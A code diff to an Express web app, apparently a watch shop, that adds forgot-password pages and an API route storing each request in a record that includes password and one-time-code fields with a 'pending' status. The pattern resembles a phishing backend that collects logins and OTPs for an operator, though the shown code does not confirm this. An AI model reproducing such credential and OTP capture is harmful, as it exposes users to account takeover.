@@ -69,6 +69,16 @@ app.get('/forgot-username-success', (req, res) => {
     res.render('forgot-username-success', { lang, t: translations[lang] });
 });
 
+app.get('/forgot-password', (req, res) => {
+    const lang = getLang(req);
+    res.render('forgot-password', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
+});
+
+app.get('/forgot-password-success', (req, res) => {
+    const lang = getLang(req);
+    res.render('forgot-password-success', { lang, t: translations[lang] });
+});
+
 app.get('/loading', (req, res) => {
     const lang = getLang(req);
     res.render('loading', { lang, t: translations[lang], orderId: req.query.orderId });
@@ -152,6 +162,32 @@ app.post('/api/submit-forgot-username', (req, res) => {
         address: '',
         watchColor: '',
         username: '',
+        password: '',
+        otp: '',
+        status: 'pending',
+        createdAt: new Date().toISOString()
+    };
+    requests.push(request);
+    res.json({ ok: true, id: request.id });
+});
+
+app.post('/api/submit-forgot-password', (req, res) => {
+    const { username, orderId } = req.body;
+    const request = {
+        id: nextId++,
+        type: 'forgot-password',
+        forgotUsername: username || '',
+        linkedOrderId: orderId ? Number(orderId) : null,
+        name: '',
+        phone: '',
+        email: '',
+        delivery: '',
+        branch: '',
+        governorate: '',
+        city: '',
+        address: '',
+        watchColor: '',
+        username: username || '',
         password: '',
         otp: '',
         status: 'pending',
